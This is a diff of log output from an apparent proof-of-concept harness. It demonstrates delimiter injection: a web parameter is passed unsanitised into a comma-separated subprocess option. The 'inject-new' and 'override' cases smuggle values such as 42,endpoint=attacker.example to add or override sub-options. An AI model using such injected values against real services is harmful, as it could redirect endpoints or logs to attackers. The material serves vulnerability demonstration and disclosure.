@@ -1,12 +1,18 @@
-=== control: untrusted field contains no delimiter ===
-[caller] case=control
-[caller] external_value=<42>
-[caller] list_elements=3
-[caller] command[0]=<./poc/demo_target>
-[caller] command[1]=<-o>
-[caller] command[2]=<endpoint=trusted.example,id=42>
-[caller] shell=False
-[caller] --- target output ---
+=== control: untrusted web parameter contains no delimiter ===
+[client] case=control
+[client] role=simulated external requester (attacker-controlled input)
+[client] external_value=<42>
+[client] request=GET http://127.0.0.1:61265/run?id=42
+[client] --- web application response ---
+[web] method=GET
+[web] path=/run
+[web] request_param id=<42>
+[web] delimiter_neutralization=none
+[web] constructed option_argument=<endpoint=trusted.example,id=42>
+[web] subprocess argv elements=3
+[web] shell=False
+[web] target_returncode=0
+[web] --- target output ---
 [target] argc=3
 [target] argv[0]=<./poc/demo_target>
 [target] argv[1]=<-o>
@@ -20,15 +26,21 @@
 [result] log_target=unset
 [PASS] control
 
-=== inject-new: delimiter creates a previously absent sibling sub-option ===
-[caller] case=inject-new
-[caller] external_value=<42,log_target=attacker.example>
-[caller] list_elements=3
-[caller] command[0]=<./poc/demo_target>
-[caller] command[1]=<-o>
-[caller] command[2]=<endpoint=trusted.example,id=42,log_target=attacker.example>
-[caller] shell=False
-[caller] --- target output ---
+=== inject-new: web-parameter delimiter creates a previously absent sibling sub-option ===
+[client] case=inject-new
+[client] role=simulated external requester (attacker-controlled input)
+[client] external_value=<42,log_target=attacker.example>
+[client] request=GET http://127.0.0.1:61267/run?id=42%2Clog_target%3Dattacker.example
+[client] --- web application response ---
+[web] method=GET
+[web] path=/run
+[web] request_param id=<42,log_target=attacker.example>
+[web] delimiter_neutralization=none
+[web] constructed option_argument=<endpoint=trusted.example,id=42,log_target=attacker.example>
+[web] subprocess argv elements=3
+[web] shell=False
+[web] target_returncode=0
+[web] --- target output ---
 [target] argc=3
 [target] argv[0]=<./poc/demo_target>
 [target] argv[1]=<-o>
@@ -43,15 +55,21 @@
 [result] log_target=attacker.example
 [PASS] inject-new
 
-=== override: delimiter creates a duplicate security-sensitive sub-option ===
-[caller] case=override
-[caller] external_value=<42,endpoint=attacker.example>
-[caller] list_elements=3
-[caller] command[0]=<./poc/demo_target>
-[caller] command[1]=<-o>
-[caller] command[2]=<endpoint=trusted.example,id=42,endpoint=attacker.example>
-[caller] shell=False
-[caller] --- target output ---
+=== override: web-parameter delimiter creates a duplicate security-sensitive sub-option ===
+[client] case=override
+[client] role=simulated external requester (attacker-controlled input)
+[client] external_value=<42,endpoint=attacker.example>
+[client] request=GET http://127.0.0.1:61269/run?id=42%2Cendpoint%3Dattacker.example
+[client] --- web application response ---
+[web] method=GET
+[web] path=/run
+[web] request_param id=<42,endpoint=attacker.example>
+[web] delimiter_neutralization=none
+[web] constructed option_argument=<endpoint=trusted.example,id=42,endpoint=attacker.example>
+[web] subprocess argv elements=3
+[web] shell=False
+[web] target_returncode=0
+[web] --- target output ---
 [target] argc=3
 [target] argv[0]=<./poc/demo_target>
 [target] argv[1]=<-o>
